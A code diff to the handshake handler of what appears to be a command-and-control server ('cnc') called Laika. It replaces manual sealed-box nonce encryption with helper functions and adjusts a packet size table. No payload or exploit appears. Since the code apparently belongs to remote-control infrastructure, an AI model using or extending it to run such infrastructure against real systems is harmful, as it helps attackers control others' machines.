@@ -6,7 +6,7 @@
 #include "cnc.h"
 
 LAIKAPKT_SIZE laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_box_SEALBYTES + LAIKA_NONCESIZE + crypto_box_PUBLICKEYBYTES
+    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + LAIKAENC_SIZE(LAIKA_NONCESIZE) + crypto_box_PUBLICKEYBYTES
 };
 
 void laikaC_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id, void *uData) {
@@ -15,7 +15,7 @@ void laikaC_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id, void *uData) {
     switch (id) {
         case LAIKAPKT_HANDSHAKE_REQ: {
             char magicBuf[LAIKA_MAGICLEN];
-            uint8_t encNonce[crypto_box_SEALBYTES + LAIKA_NONCESIZE], nonce[LAIKA_NONCESIZE];
+            uint8_t nonce[LAIKA_NONCESIZE];
             uint8_t major, minor;
 
             laikaS_read(&peer->sock, (void*)magicBuf, LAIKA_MAGICLEN);
@@ -28,21 +28,15 @@ void laikaC_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id, void *uData) {
                 LAIKA_ERROR("invalid handshake request!\n");
 
              /* read & decrypt nonce */
-            laikaS_read(&peer->sock, encNonce, sizeof(encNonce));
-            if (crypto_box_seal_open(nonce, encNonce, sizeof(encNonce), cnc->pub, cnc->priv) != 0)
-                LAIKA_ERROR("Failed to decrypt nonce!\n");
+            laikaS_readENC(&peer->sock, nonce, LAIKA_NONCESIZE, cnc->pub, cnc->priv);
 
             /* read peer's public key */
             laikaS_read(&peer->sock, peer->peerPub, sizeof(peer->peerPub));
 
-            /* encrypt decrypted nonce with peer's pub key */
-            if (crypto_box_seal(encNonce, nonce, sizeof(nonce), peer->peerPub) != 0)
-                LAIKA_ERROR("Failed to enc nonce!\n");
-
             /* queue response */
             laikaS_writeByte(&peer->sock, LAIKAPKT_HANDSHAKE_RES);
             laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
-            laikaS_write(&peer->sock, encNonce, sizeof(encNonce));
+            laikaS_writeENC(&peer->sock, nonce, LAIKA_NONCESIZE, peer->peerPub); /* encrypt nonce with peer's public key */
 
             LAIKA_DEBUG("accepted handshake from peer %x\n", peer);
             break;
